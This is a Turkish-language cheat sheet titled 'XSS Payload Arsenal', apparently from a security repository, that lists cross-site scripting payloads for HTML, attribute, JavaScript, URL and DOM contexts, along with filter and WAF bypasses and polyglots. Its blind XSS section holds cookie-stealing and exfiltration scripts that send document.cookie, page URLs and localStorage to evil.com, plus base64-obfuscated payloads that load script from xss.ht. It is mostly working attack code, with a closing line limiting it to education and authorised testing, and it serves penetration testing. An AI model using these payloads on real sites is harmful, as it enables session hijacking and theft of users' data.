# 💉 XSS (Cross-Site Scripting) Payload Koleksiyonu

[🇬🇧 English](../XSS.md)

```
  ██╗  ██╗███████╗███████╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
   ╚███╔╝ ███████╗███████╗    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
   ██╔██╗ ╚════██║╚════██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ██╔╝ ██╗███████║███████║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 📋 İçindekiler

- [Temel Payload'lar](#-temel-payloadlar)
- [Event Handler (Olay Yöneticisi) Payload'ları](#-event-handler-olay-yöneticisi-payloadları)
- [Öznitelik Enjeksiyonu (Attribute Injection)](#-öznitelik-enjeksiyonu-attribute-injection)
- [JavaScript Bağlamı (Context)](#-javascript-bağlamı-context)
- [Filtre Atlatma (Filter Bypass)](#-filtre-atlatma-filter-bypass)
- [WAF Atlatma](#-waf-atlatma)
- [Poliglot (Polyglot) Payload'lar](#-poliglot-polyglot-payloadlar)
- [Kör (Blind) XSS](#-kör-blind-xss)
- [DOM XSS](#-dom-xss)
- [Bağlama Göre Hızlı Başvuru](#-bağlama-göre-hızlı-başvuru)

---

## 🔴 Temel Payload'lar

### Klasik Script Etiketleri

```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>console.log('XSS')</script>
```

### Kendini Kapatan Etiketler (Self-Closing)

```html
<script src="https://evil.com/xss.js"/>
<script src=//evil.com/xss.js></script>
<script/src="https://evil.com/xss.js"></script>
```

### Harici Script Yükleme

```html
<script src="https://evil.com/xss.js"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:,alert(1)"></script>
```

---

## ⚡ Event Handler (Olay Yöneticisi) Payload'ları

### Görsel Olayları (Image Events)

```html
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<img src="x" onerror="alert(1)">
<img src=1 onerror=alert(1)>
<img src=/ onerror=alert(1)>
<img src="javascript:alert(1)">
<img onload=alert('XSS') src="valid.jpg">
```

### SVG Olayları

```html
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>
<svg onload="alert('XSS')">
<svg><script>alert(1)</script></svg>
<svg><script>alert&#40;1&#41;</script></svg>
```

### Body Olayları

```html
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<body onfocus=alert('XSS')>
<body onhashchange=alert('XSS')>
<body onscroll=alert('XSS')>
```

### Girdi Alanı Olayları (Input Events)

```html
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
<input type="image" src=x onerror=alert('XSS')>
<input type="text" onfocus="alert('XSS')" autofocus>
```

### Diğer Event Handler Örnekleri

```html
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<iframe onload=alert('XSS')>
<object data=javascript:alert('XSS')>
<embed src=javascript:alert('XSS')>
<a onmouseover=alert('XSS')>click me</a>
<div onmouseover=alert('XSS')>hover me</div>
<form onsubmit=alert('XSS')><input type=submit>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
```

---

## 🔗 Öznitelik Enjeksiyonu (Attribute Injection)

### Öznitelikten Dışarı Çıkma

```html
"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>
'><script>alert('XSS')</script>
'><img src=x onerror=alert('XSS')>
"><svg onload=alert('XSS')>
" onmouseover="alert('XSS')
' onmouseover='alert(1)'
" onfocus="alert('XSS')" autofocus "
```

### Öznitelik İçinde Olay Çalıştırma

```html
" onclick=alert('XSS') "
" onmouseover=alert('XSS') "
" onfocus=alert('XSS') autofocus "
" onload=alert('XSS') "
```

### Style Özniteliği (Eski Tarayıcılar)

```html
<div style="background:url(javascript:alert('XSS'))">
<div style="width:expression(alert('XSS'))">
```

---

## 📜 JavaScript Bağlamı (Context)

### JavaScript Kodundan Dışarı Çıkma

```javascript
';alert('XSS');//
";alert('XSS');//
</script><script>alert('XSS')</script>
'-alert('XSS')-'
"-alert('XSS')-"
\';alert(1)//
\";alert(1)//
```

### Şablon Dizgileri (Template Literals)

```javascript
${alert('XSS')}
`${alert(1)}`
${alert`XSS`}
```

### JSON İçinde

```json
{"name":"test","value":"</script><script>alert(1)</script>"}
```

---

## 🔓 Filtre Atlatma (Filter Bypass)

### Büyük/Küçük Harf Varyasyonları

```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<scRIPT>alert('XSS')</scRIPT>
<IMG SRC=x OnErRoR=alert('XSS')>
```

### Etiket İçi Parçalama (Tag Breaking)

```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<sc\x00ript>alert('XSS')</sc\x00ript>
<scr\x09ipt>alert('XSS')</scr\x09ipt>
```

### Kodlama - HTML Varlıkları (HTML Entities)

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>
```

### URL Kodlaması (URL Encoding)

```html
<img src=x onerror=%61%6c%65%72%74%28%31%29>
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
```

### Unicode Kodlaması

```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
```

### Null Byte Enjeksiyonu

```html
<scr\x00ipt>alert('XSS')</scr\x00ipt>
<img src=x onerror=alert('XSS')\x00>
```

### Boşluk Karakteri Atlatma

```html
<img/src=x/onerror=alert('XSS')>
<img\nsrc=x\nonerror=alert('XSS')>
<img\tsrc=x\tonerror=alert('XSS')>
<img src=x	onerror=alert('XSS')>
```

### Parantez Olmadan Çalıştırma

```html
<script>alert`XSS`</script>
<script>onerror=alert;throw'XSS'</script>
<img src=x onerror=alert`1`>
<img src=x onerror="window['alert'](1)">
```

### Tırnak İşareti Olmadan Çalıştırma

```html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(/XSS/)>
```

---

## 🛡️ WAF Atlatma

### Çift Kodlama (Double Encoding)

```html
%253Cscript%253Ealert(1)%253C/script%253E
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
```

### Açıklama Satırları Kullanma

```html
<script>/**/alert('XSS')/**/</script>
<img src=x onerror=/**/alert(1)/**//>
<!--<script>-->alert(1)<!--</script>-->
```

### Satır Sonu / Kesmesi Karakterleri

```html
<script>
alert('XSS')
</script>

<img src=x
onerror
=
alert(1)>
```

### Alternatif Etiketler

```html
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<math><maction xlink:href="javascript:alert(1)">click
<isindex action="javascript:alert(1)" type=submit value=click>
```

### SVG Tabanlı Atlatma

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x dur=1s>
<svg/onload=alert(1)>
```

### `eval` Kullanımı

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

### `setTimeout`/`setInterval` Kullanımı

```html
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>
<img src=x onerror=setTimeout('alert(1)')>
```

### `fetch` Kullanımı

```html
<script>fetch('https://evil.com/'+document.cookie)</script>
```

---

## 🎭 Poliglot (Polyglot) Payload'lar

### Evrensel XSS Poliglotları

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telecomhallx27telecomhall;)>'">

"><img src=x onerror=alert(1)//>'\"><img src=x onerror=alert(1)//><img src=x onerror=alert(1)//>'\"

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### Kısa Poliglotlar

```html
'"><script>alert(1)</script>
'"><img src=x onerror=alert(1)>
```

---

## 👁️ Kör (Blind) XSS

### Çerez Çalma (Cookie Stealer)

```html
<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>
<script>fetch('https://evil.com/'+document.cookie)</script>
<img src=x onerror="this.src='https://evil.com/?c='+document.cookie">
```

### Veri Sızdırma (Data Exfiltration)

```html
<script>
var i=new Image();
i.src="https://evil.com/?cookie="+document.cookie+"&url="+document.URL;
</script>

<script>
fetch('https://evil.com/collect',{
    method:'POST',
    body:JSON.stringify({
        cookie:document.cookie,
        url:location.href,
        localStorage:JSON.stringify(localStorage)
    })
})
</script>
```

### XSS Hunter Payload'ları

```html
"><script src=https://xss.ht></script>
"><img src=x onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veHNzLmh0Lz9jPScrZG9jdW1lbnQuY29va2ll'))">
```

### Form Alanları İçin Kör XSS

```html
"><script src="https://your.xss.ht"></script>
test@test.com"><script src="https://your.xss.ht"></script>
{{constructor.constructor('fetch("https://your.xss.ht?c="+document.cookie)')()}}
```

---

## 🌐 DOM XSS

### Kaynak Tabanlı (Source-based) DOM XSS

```javascript
// URL fragment (parçası)
https://example.com#<script>alert(1)</script>

// URL parametresi
https://example.com?name=<script>alert(1)</script>

// document.referrer
Referer: <script>alert(1)</script>
```

### Yaygın Sink'ler (Hassas Yürütme Noktaları)

```javascript
// innerHTML
document.getElementById('x').innerHTML = userInput;
// Payload: <img src=x onerror=alert(1)>

// document.write
document.write(userInput);
// Payload: <script>alert(1)</script>

// eval
eval(userInput);
// Payload: alert(1)

// location
location = userInput;
location.href = userInput;
// Payload: javascript:alert(1)
```

### jQuery Sink'leri

```javascript
// $().html()
$('#x').html(userInput);
// Payload: <img src=x onerror=alert(1)>

// $()
$(userInput);
// Payload: <img src=x onerror=alert(1)>

// $.parseHTML()
$.parseHTML(userInput);
// Payload: <img src=x onerror=alert(1)>
```

### Angular Payload'ları

```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

---

## 📊 Bağlama Göre Hızlı Başvuru

### HTML Bağlamı
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Öznitelik Bağlamı (Attribute Context)
```html
" onmouseover="alert(1)
"><script>alert(1)</script>
' onfocus='alert(1)' autofocus='
```

### JavaScript Dizgi Bağlamı (String Context)
```javascript
';alert(1)//
"-alert(1)-"
</script><script>alert(1)</script>
```

### URL Bağlamı
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

## 📚 Kaynaklar

- [PortSwigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

<p align="center">
  <b>💉 XSS Payload Arsenal</b><br>
  <i>Yalnızca eğitim ve yetkili güvenlik testleri amaçlıdır!</i>
</p>
